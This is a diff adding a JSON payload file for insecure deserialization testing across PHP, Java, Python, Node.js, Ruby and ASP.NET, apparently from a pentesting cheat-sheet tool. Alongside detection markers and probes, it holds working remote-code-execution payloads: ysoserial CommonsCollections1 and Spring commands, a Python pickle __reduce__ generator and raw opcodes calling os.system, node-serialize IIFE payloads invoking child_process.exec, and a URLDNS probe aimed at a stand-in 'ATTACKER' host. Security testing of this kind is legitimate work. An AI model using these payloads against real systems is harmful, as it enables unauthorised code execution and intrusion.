@@ -1,0 +1,35 @@
+{
+  "meta": {
+    "name": "Deserialization",
+    "icon": "📦",
+    "description": "Insecure deserialization payloads and detection techniques for PHP, Java, Python pickle, Node.js, and Ruby. Covers gadget chain indicators, detection probes, and tool references.",
+    "version": "1.0",
+    "updated": "2026-03-04",
+    "total": 18
+  },
+  "payloads": [
+    {"id":1,"code":"O:8:\"stdClass\":0:{}","description":"PHP benign serialized object — safe probe to confirm PHP unserialize() is being called","category":"php","platform":["php"],"tags":["php","unserialize","probe","benign"]},
+    {"id":2,"code":"O:4:\"User\":1:{s:4:\"name\";s:5:\"admin\";}","description":"PHP serialized User object — probe with known class name; watch for class not found errors","category":"php","platform":["php"],"tags":["php","unserialize","object"]},
+    {"id":3,"code":"O:29:\"Illuminate\\Support\\MessageBag\":0:{}","description":"Laravel gadget chain entry — triggers __destruct chain in vulnerable Laravel versions","category":"php","platform":["php"],"tags":["php","laravel","gadget","destruct"]},
+    {"id":4,"code":"TzozMjoiR3V6emxlXENvbXBvbmVudFxDb3JlXFNlcmlhbGl6ZWRSZXNwb25zZSI6Mzp7czo0OiJsb2NrIjtiOjA7czo4OiJyZXNwb25zZSI7TzoyNjoiR3V6emxlXFBzcjdcUmVzcG9uc2UiOjY6e3M6Njoic3RhdHVzIjtpOjIwMDtzOjc6InJlYXNvbiI7czoyOiJPSyI7czo3OiJoZWFkZXJzIjthOjA6e31zOjQ6ImJvZHkiO047czo4OiJwcm90b2NvbCI7czozOiIxLjEiO3M6MTA6InJlcXVlc3RVcmwiO047fXM6ODoicmVxdWVzdHMiO2E6MDp7fX0=","description":"Guzzle PHP gadget chain base64 — example of serialized gadget chain payload structure","category":"php","platform":["php"],"tags":["php","guzzle","gadget","base64"]},
+
+    {"id":5,"code":"rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAAhwb3J0SAARZGF0YUhhc2hDb2RlTAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgAETAAEaG9zdHEAfgAETAAIcHJvdG9jb2xxAH4ABEwAAXJlZnEAfgAEeHD//////////3EAfgAGdAAFcHduZWR4","description":"Java serialized payload marker — starts with rO0AB (base64 of aced0005), confirms Java deserial","category":"java","platform":["java"],"tags":["java","serialized","marker","detection"]},
+    {"id":6,"code":"aced0005","description":"Java serialization magic bytes hex — every Java serialized stream starts with 0xaced 0x0005","category":"java","platform":["java"],"tags":["java","magic-bytes","detection"]},
+    {"id":7,"code":"java -jar ysoserial.jar CommonsCollections1 'id' | base64","description":"ysoserial CommonsCollections1 gadget — generates RCE payload for Apache Commons Collections","category":"java","platform":["java"],"tags":["java","ysoserial","commons-collections","rce","gadget"]},
+    {"id":8,"code":"java -jar ysoserial.jar Spring1 'touch /tmp/pwned' | base64","description":"ysoserial Spring gadget chain — RCE via Spring Framework deserialization","category":"java","platform":["java"],"tags":["java","ysoserial","spring","rce","gadget"]},
+    {"id":9,"code":"java -jar ysoserial.jar URLDNS 'http://ATTACKER' | base64","description":"ysoserial URLDNS gadget — safe DNS-only probe; no RCE, only confirms deserialization","category":"java","platform":["java"],"tags":["java","ysoserial","urldns","probe","safe"]},
+
+    {"id":10,"code":"import pickle,os; class E(object):\n def __reduce__(self):\n  return (os.system,('id',))\npickle.dumps(E())","description":"Python pickle RCE payload generator — __reduce__ method executes OS command on unpickle","category":"python","platform":["python"],"tags":["python","pickle","rce","__reduce__"]},
+    {"id":11,"code":"cos\nsystem\n(S'id'\ntR.","description":"Python pickle opcode RCE — raw pickle opcodes calling os.system('id')","category":"python","platform":["python"],"tags":["python","pickle","opcodes","rce"]},
+    {"id":12,"code":"cPickle.loads(base64.b64decode('Y29zCnN5c3RlbQooUydpZCcKdFIu'))","description":"Python pickle base64 payload decoding — decodes to cos\\nsystem\\n(S'id'\\ntR.","category":"python","platform":["python"],"tags":["python","pickle","base64","rce"]},
+
+    {"id":13,"code":"_$$ND_FUNC$$_function(){require('child_process').exec('id',function(e,r){console.log(r)})}()","description":"Node.js node-serialize RCE — IIFE function in serialized JSON triggers RCE on deserialize","category":"nodejs","platform":["nodejs"],"tags":["nodejs","node-serialize","rce","iife"]},
+    {"id":14,"code":"{\"rce\":\"_$$ND_FUNC$$_function (){require('child_process').exec('id')}()\"}","description":"node-serialize JSON RCE payload — JSON with IIFE marker for node-serialize library","category":"nodejs","platform":["nodejs"],"tags":["nodejs","node-serialize","json","rce"]},
+
+    {"id":15,"code":"Marshal.load(Base64.decode64('BAhJIglpZAY6BkVU'))","description":"Ruby Marshal.load RCE probe — Marshal format string; full RCE requires gadget chain","category":"ruby","platform":["ruby"],"tags":["ruby","marshal","deserialization"]},
+    {"id":16,"code":"\\x04\\x08","description":"Ruby Marshal magic bytes — 0x04 0x08 indicates Ruby Marshal serialized data","category":"ruby","platform":["ruby"],"tags":["ruby","marshal","magic-bytes","detection"]},
+
+    {"id":17,"code":"Content-Type: application/x-java-serialized-object","description":"Java serialization content-type header — endpoint accepts serialized Java objects","category":"detection","platform":["java"],"tags":["detection","java","content-type","header"]},
+    {"id":18,"code":"viewstate=%2FwEPDwUJODExMDE5NzY5ZGQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgEFGGN0bDAwJExvZ2luVXNlcjEkbG9naW5Cvg%3D%3D","description":"ASP.NET ViewState with MAC disabled — attempt tamper if EnableViewStateMac=false","category":"detection","platform":["dotnet"],"tags":["dotnet","viewstate","asp.net","deserialization"]}
+  ]
+}
